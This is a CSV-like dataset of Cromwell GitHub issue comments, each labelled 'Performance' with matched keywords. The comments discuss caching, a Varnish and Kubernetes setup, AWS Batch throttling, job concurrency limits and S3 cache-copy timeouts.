Performance,"The following gives a 2 GB cache on top of Cromwell, and forwards aborts to a different host. I've manually tested with the following configuration as an excuse to play w/ Kubernetes:. ## Varnish config. points all queries to reader service except aborts:; ```; vcl 4.0;. backend worker {; .host = ""cromwell-worker-service.default"";; .port = ""8000"";; }. backend reader {; .host = ""cromwell-reader-service.default"";; .port = ""8000"";; }. sub vcl_recv {; if (req.url ~ ""abort/$"") {; set req.backend_hint = worker;; } else {; set req.backend_hint = reader;; }; }; ```; Source: https://raw.githubusercontent.com/danbills/ammoniteExample/master/kubernetes/varnish-rw-cromwell-config.vcl. ## Varnish docker . w/ latest 6.1 version:; https://hub.docker.com/r/danbills/varnish/; Source: https://github.com/danbills/ammoniteExample/tree/master/kubernetes/varnish. ## Kubernetes Config(map); Kubernetes [Pod](https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/) to run varnish w/ the config file loaded into a [ConfigMap](https://cloud.google.com/kubernetes-engine/docs/concepts/configmap) named `rw`:; ```; apiVersion: v1; kind: Pod; metadata:; name: varnish-cache; labels:; app: varnish-cache; spec:; containers:; - name: cache; resources:; requests:; # We'll use two gigabytes for each varnish cache; memory: 2Gi; image: danbills/varnish:6_1; imagePullPolicy: Always; args: [""-F"", ""-f"", ""/conf/varnish-rw-cromwell-config.vcl"", ""-a"" , ""0.0.0.0:8080"" , ""-s"" , ""malloc,2G""]; ports:; - containerPort: 8080; volumeMounts:; - name: config-volume; mountPath: /conf; volumes:; - name: config-volume; configMap:; # Provide the name of the ConfigMap containing the files you want; # to add to the container; name: rw; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248,6,"['cache', 'load']","['cache', 'loaded']"
Performance,"The issue at play is that the AWS backend uses about 3-4 Batch API calls when Cromwell submits a job. Also Cromwell submits multiple jobs concurrently. Altogether, this hits the Batch API request limit pretty quickly. It's worth noting that the requests from Cromwell are to get jobs on a Batch Job Queue. If you are starting with a ""cold"" Batch environment, it will take a couple minutes for an instance to spin up. Batch will then place as many of the queued jobs as it can on instances. So in effect you should still get plenty of parallelism, despite jobs having been queued at a throttled rate initially.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4496#issuecomment-470358342:138,concurren,concurrently,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4496#issuecomment-470358342,5,"['Queue', 'concurren', 'queue', 'throttle']","['Queue', 'concurrently', 'queued', 'throttled']"
Performance,"The issue is that the way one loads a backend into Cromwell is to reference the implementing scala class, like [this](https://github.com/broadinstitute/cromwell/blob/f1955f963ee65ca9296f554376bd655b9529c10d/cromwell.examples.conf#L466). If we change the name of that class old config files will be broken. In theory we could deprecate it and have some sort of redirect but not sure offhand how that'd work. We have the same problem in #2440",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328217096:30,load,loads,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328217096,1,['load'],['loads']
Performance,"The only theoretical downside is that it could take longer before we realize it's a cache miss and fall back to running the job. In practice though, this query which is suppose to make us ""fail faster"" is under performing so badly that it's effectively slowing us down. So it's a net positive in call caching time and resources spent. The alternative would be to replace it with something more performant, which we can always do later if the need arises.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-422900723:84,cache,cache,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-422900723,3,"['cache', 'perform']","['cache', 'performant', 'performing']"
Performance,"The only way they appear is similar at all is that they involve the database. FWIW this sort of topic falls under what I see as a third tier of Cromwell which we're not currently considering, but IMO will need to over the next year. There is/will be:. - Cromwell as we know it now. Not intended for horizontal scaling situations. Expected that it can meet the needs of most typical users needs out of the box without a lot of configuration and that it can run anywhere.; - Cromwell with cool implementations of subsystems that are optimized to take advantage of GCP for scaling purposes (i.e. CaaS, but such that a savvy user could set up their own if they wanted to); - An in between phase for people who have scaling needs beyond vanilla cromwell but aren't on GCP, and most likely are on more traditional setups (on prem, hpc, etc). To some extent we might be able to rely on outside contributions here once we've made supporting both the first two (as that'd imply taking advantage of things like the service registry for pluggable implementations) but we'll likely need to prime that pump.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-345292377:531,optimiz,optimized,531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-345292377,1,['optimiz'],['optimized']
Performance,"The use case in Cromwell is the same as FireCloud - Cromwell now will use cached data if it exists, and not if it doesn't, but you can't tell why it wasn't in cache when you expected it to be. People could do forensics themselves, but if we had this stored and accessible you could quickly see ""the docker image changed"" or ""the file changed"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583:74,cache,cached,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583,2,['cache'],"['cache', 'cached']"
Performance,The wrong paths were being returned for call cached detritus from the `/logs` endpoint.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992:45,cache,cached,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992,1,['cache'],['cached']
Performance,"Theory 1:; I've also seen this issue. I've set our `concurrent-job-limit` parameter in the backend to 150 and yet the number of concurrent jobs (including those pending) seems to stay at around 60-65. . Could the other 90 be from tasks that still need to be 'ticked off' as complete?. My suspicion on this is that the `check-alive` parameter in the config is set to `squeue -j ${job_id}`.; On our cluster we have around 3 hours to continue running commands like `scontrol show job` to see the metadata on the job and find logs. This is useful but, `squeue -j ${job_id}` still returns true well and truly after the job has completed/failed. Could you try massively increasing the job limit (to say 10000) and see if that changes anything?. Theory 2:; Your configuration file could need a scale up - it may be that the number of system io requests require increasing:. ```; system {; io {; number-of-requests = 100000; per = 100 seconds; number-of-attempts = 50; }; ```. Will allow your job to make 1000 requests per second. For some of those batch calling jobs with many vcf inputs, it may be taking some time for the server to set up the task?. Theory 3:; Your duplication-strategy is causing lag.; Can you confirm that in providers.slurm.filesystems that you have hard-link or soft-link as the top priority for the localization and caching settings, over copying?. Alexis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-554183952:52,concurren,concurrent-job-limit,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-554183952,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"There are already call caching WFs in centaur - cacheBetweenWF, cacheWithinWF, readFromCache, writeToCache. All four are currently set to 'ignore' though, so they're not run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1276#issuecomment-239225597:48,cache,cacheBetweenWF,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1276#issuecomment-239225597,2,['cache'],"['cacheBetweenWF', 'cacheWithinWF']"
Performance,"There hasn't unfortunately. This is sort of a desperate thought but maybe you can try to see if you can cache via file path instead of file hash (https://cromwell.readthedocs.io/en/develop/Configuring/#local-filesystem-options). I don't know if its configured to work for AWS but ""hashing-strategy"" could be set to path -- though it may only ever work for the local filesystem and not S3. ```; # Possible values: file, path, path+modtime; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here.; # Default: file; hashing-strategy: ""file""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065:104,cache,cache,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065,1,['cache'],['cache']
Performance,"There's loads of scenarios where this would be useful; iirc the case I was working on when I made this request was that I had a FOFN that contained a list of samples with bam and index filepaths, and I wanted to load that in as input to a task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1962#issuecomment-328599964:8,load,loads,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1962#issuecomment-328599964,2,['load'],"['load', 'loads']"
Performance,"Thinking about this a little more, I just added this comment to Kate's doc:; ""FWIW, I don’t necessarily need Cromwell to do the delete for me in my use case. I’m happy to do it if I have all the files at hand that I want to delete. This is important because I don’t really want an all-or-nothing delete. I usually want to delete the call cached intermediate results, but not the final outputs of the workflow (and I note that not all pipeline developers list the outputs in the wdl -- I just learned this yesterday from Megan -- so I would like some control over the delete in many cases).""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329452283:338,cache,cached,338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-329452283,1,['cache'],['cached']
Performance,This PR contains the result of the work done on CromIAM load testing https://github.com/broadinstitute/mcnulty/pull/15; There's an CromIAM + Cromwell + SAM + OpenDJ running in broad-dsde-cromwell-dev. The gatling test in the PR above can be run against that CromIAM through a [jenkins job](https://fc-jenkins.dsp-techops.broadinstitute.org/view/CromIAM-Testing/job/Taurus-Gatling-Test-Pipeline),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4265#issuecomment-445345005:56,load,load,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4265#issuecomment-445345005,1,['load'],['load']
Performance,This also causes flakiness in the call cache capoeira centaur test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3074#issuecomment-378353821:39,cache,cache,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3074#issuecomment-378353821,1,['cache'],['cache']
Performance,"This appears to be an issue with Pipelines API and its container-optimized OS (""COS"") not having the right drivers for the GPU. You could potentially try [changing the Nvidia driver version](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#gpucount-gputype-and-nvidiadriverversion) but I think your best bet is asking Google support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182:65,optimiz,optimized,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195#issuecomment-784533182,1,['optimiz'],['optimized']
Performance,"This bug is blocking Cromwell's ability to call cache, due to the fact that Cromwell won't pull ""Running"" calls as ""Succeeded"" ones. This would be very helpful to fix soon.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-308804360:48,cache,cache,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-308804360,1,['cache'],['cache']
Performance,This exists in C22+:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1354#issuecomment-276494116:102,concurren,concurrent-job-limit,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1354#issuecomment-276494116,1,['concurren'],['concurrent-job-limit']
Performance,"This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. The `ValidatedWomNamespace` produced as part of workflow materialization contains a `womValueInputs` field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855:377,perform,performing,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618685855,1,['perform'],['performing']
Performance,"This happens because the EJEAs are not aborted directly. Because they're waiting for tokens the cycle looks like this:; - WEA is waiting for all EJEAs to finish; - All running BJEAs get aborted; - This releases tokens so the next group of EJEAs can begin; - They immediately get aborted; - this releases tokens so the next group of EJEAs can begin; - Ad nauseam, until all queued EJEAs start and get aborted",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043:373,queue,queued,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043,1,['queue'],['queued']
Performance,This is about people wanting to know why their job (which should have call cached) did not call cache.; It's come up quite a few times and can be infuriating to debug,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1990#issuecomment-303823955:75,cache,cached,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1990#issuecomment-303823955,2,['cache'],"['cache', 'cached']"
Performance,This is an optimization. Currently we create one filesystem per call when really we only need one per workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221290874:11,optimiz,optimization,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221290874,1,['optimiz'],['optimization']
Performance,"This is from the point of view of the need on the FireCloud side:; In my opinion, Cromwell should call cache based upon it's best effort to know everything that is different. Clearly you could write a WDL that does the same thing in the end with different inputs (e.g. more memory is given than before), but I'd rather err on the side of no false positives than trying to make sure Cromwell is too clever. This really feels more like sugar in workbench where we could make some best guesses based upon what our users do or simply organize things in a way that it's less confusing/less effort for our users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2268#issuecomment-301481174:103,cache,cache,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2268#issuecomment-301481174,1,['cache'],['cache']
Performance,"This is likely a specific case of ""perform expensive creation of shareable resources only once in the initialization actor and figure out how to share them with the other actors collaborating in the workflow execution"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-218495580:35,perform,perform,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-218495580,1,['perform'],['perform']
Performance,"This is particularly useful since we might have lots of entries for the ""same"" cache result, so we might be able to find another one that works next time we hit the cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1510#issuecomment-251685046:79,cache,cache,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1510#issuecomment-251685046,2,['cache'],['cache']
Performance,"This is unusual, I have successfully call cached files of 1 TB in testing; so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_Comma",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:42,cache,cached,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,3,['cache'],['cached']
Performance,"This one comes up *a lot*, and will even more once people can see how much they are spending on intermediate results in FireCloud. I wanted to ask about the effort -- why large? Alex has already implemented the logic for what to delete by looking at the workflow metadata, and if we simply had an endpoint to ""evict from call cache"" we could build this outside the system pretty easily. Basically, iterate through a workflow and for every ""output"" that is not part of the workflow ""output"", you rm the file and evict the call from the task that produced it (or maybe any task that uses that output?). What are you thinking of that I'm missing? Or maybe I'm interpreting ""Large"" as being bigger than you are?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-328138653:326,cache,cache,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-328138653,1,['cache'],['cache']
Performance,"This sounds very familiar... and in that foggy memory it wasn't what we; thought it was (ie stdout still being flushed by the time we were reading; it). Are we sure it's not a different race condition, with the same; effect? For example, we aren't really waiting until the task is finished; before checking?. -------------------------------; Kristian Cibulskis; Engineering Director, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Tue, Jan 17, 2017 at 8:44 PM, Paul Grosu <notifications@github.com>; wrote:. > @geoffjentry <https://github.com/geoffjentry> Maybe you write first write; > a file called lock or lock_specific_filename, which denotes that things are; > still in the process of being written. Once all the files have been written; > then you just remove the lock files. Any system trying to read will first; > look for the lock files. If they are found it will wait with an exponential; > or constant periodic backoff, otherwise it will start reading the files.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1868#issuecomment-273358074>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABW4g0OI5VfW6ajtvkrwkyPWzbtmzljWks5rTW6HgaJpZM4LmWsT>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1868#issuecomment-273642329:186,race condition,race condition,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1868#issuecomment-273642329,1,['race condition'],['race condition']
Performance,This starts happening again on a 20k wide scatter (with call cache read OFF). Metadata can be lost as writes can fail without failing the workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297413274:61,cache,cache,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297413274,1,['cache'],['cache']
Performance,"This would be a better use case for pull, which will check the cache first and not ask for the confirmation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463863223:63,cache,cache,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463863223,1,['cache'],['cache']
Performance,"This would be excellent if true, let's just confirm that it is!. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Thu, Sep 8, 2016 at 9:48 AM, Jeff Gentry notifications@github.com; wrote:. > Actually now that I think about it this is possible w/o a code change. The; > service registry stuff is loaded in dynamically by the conf file so you'd; > just need to not include a metadata service in your conf; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245602916,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ABW4g3bDS29DaHzNNAVesYu_UT85_bhCks5qoBIrgaJpZM4J3efD; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245732160:388,load,loaded,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245732160,1,['load'],['loaded']
Performance,"To clarify after discussion with @mcovarr:; This is a per-workflow limitation: each workflow chooses not to start new jobs until it sees its number of ""queued jobs"" go under a certain limit.; It doesn't protect against someone starting 10 million workflows with 1 job. That's what the token dispenser does.; It would make it more difficult to distinguish between a job that can't be started because its dependencies are not fulfilled and a job that is not being started because there are too many queued jobs already: they would both have the same `NotStarted` status. We could introduce a new status but this has a cost in terms of educating users etc...; This seems TechTalk worthy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370571661:152,queue,queued,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370571661,2,['queue'],['queued']
Performance,"To clarify the current situation... Most of these ""don't affect the results"" attributes are indeed ignored for call caching. But workflow inputs are all used. So, if it's a hard-coded value it won't be call cached, but if the attribute is set by an expression based on an input, the input value will be hashed even if the runtime attribute value isn't. Hope that made sense...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881:207,cache,cached,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881,1,['cache'],['cached']
Performance,"To explain, ""1.0"" is a very loaded term in my mind. People have already been ignoring the `0.` colloquially anyways, I'd rather just drop it and move on with life",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1586#issuecomment-254273543:28,load,loaded,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1586#issuecomment-254273543,1,['load'],['loaded']
Performance,"To give some context, as we work on the NHGRI AnVIL, it is of interest to produce workflows that utilize the PanCancer atlas. The representation of the atlas in BigQuery is excellent for learning both about scalable solutions and about cancer biology. With Cromwell+R we can protect the investigators from working with SQL directly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4638#issuecomment-468419113:207,scalab,scalable,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4638#issuecomment-468419113,1,['scalab'],['scalable']
Performance,"To save future metadata spelunking: . ```; {; ""Call caching read result"": ""Cache Miss"",; ""executionStatus"": ""Running"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6/execution/stdout"",; ""shardIndex"": 6,; ""outputs"": {; ""gatk_cnv_coverage_file_gcbias"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6/execution/SM-74NEG.gc_corrected_coverage.tsv""; },; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""coverage_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalWholeGenomeCoverage/shard-6/execution/SM-74NEG.coverage.tsv"",; ""enable_gc_correction"": true,; ""entity_id"": ""SM-74NEG"",; ""mem"": 4,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""annotated_targets"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalAnnotateTargets/shard-6/execution/SM-74NEG.annotated.tsv""; },; ""returnCode"": 0,; ""jobId"": ""12340"",; ""backend"": ""Local"",; ""end"": ""2016-09-26T19:52:35.224Z"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6"",; ""attempt"": 1,; ""executionEvents"": [{; ""startTime"": ""2016-09-26T19:49:19.556Z"",; ""description"": ""Pending"",; ""endTime"": ""2016-09-26T19:49:19.556Z""; }, {; ""startTime"": ""2016-09-26T19:49:19.556Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249866905:75,Cache,Cache,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249866905,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"To summarize, these will be the spec mandated minimums. There'll also be configuration parameters in Cromwell to tune these higher if one wants. Cromwell will attempt to check file size *prior* to reading it or pulling it across the network for cloud filesystems. Error messages should be very clear and checked past @katevoss . `read_bool()` - 5 chars; `read_int()` - 19 chars; `read_float()` - 50 chars; `read_string()` - 128K ; `read_lines()` - 128K; `read_json()` - 128K; `read_[tsv|map|object]()` - 1MB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-300349096:113,tune,tune,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-300349096,1,['tune'],['tune']
Performance,"ToL: (you can never get enough of a good thing...): being able to see a graph of components' ""load level"" over time would be awesome...!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370923521:94,load,load,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370923521,1,['load'],['load']
Performance,"ToL:. It'd probably be best to slim down and refactor the old engine `cromwell.CromwellTestkitSpec` to a `cromwell.core.CromwellTestKitSpec` and `cromwell.engine.WorkflowTestKitSpec`. Also, the actor system created in the current `CromwellTestkitSpec` uses a custom configuration. As it doesn't fall back to `ConfigFactory.load()`, it doesn't seem to be support modifying [`akka.test.timefactor`](https://github.com/akka/akka/blob/v2.3.12/akka-testkit/src/main/scala/akka/testkit/TestKit.scala#L712-L714) on the sbt command line.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/906#issuecomment-222010926:323,load,load,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/906#issuecomment-222010926,1,['load'],['load']
Performance,"Trivially happened again, same error... Output of `Ctl-\`:. ```; ""shutdownHook1"" #44 prio=5 os_prio=0 tid=0x00007fdbcc9ce000 nid=0x10a8 waiting on condition [0x00007fd9ccfce000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.ja",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:722,concurren,concurrent,722,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,4,['concurren'],['concurrent']
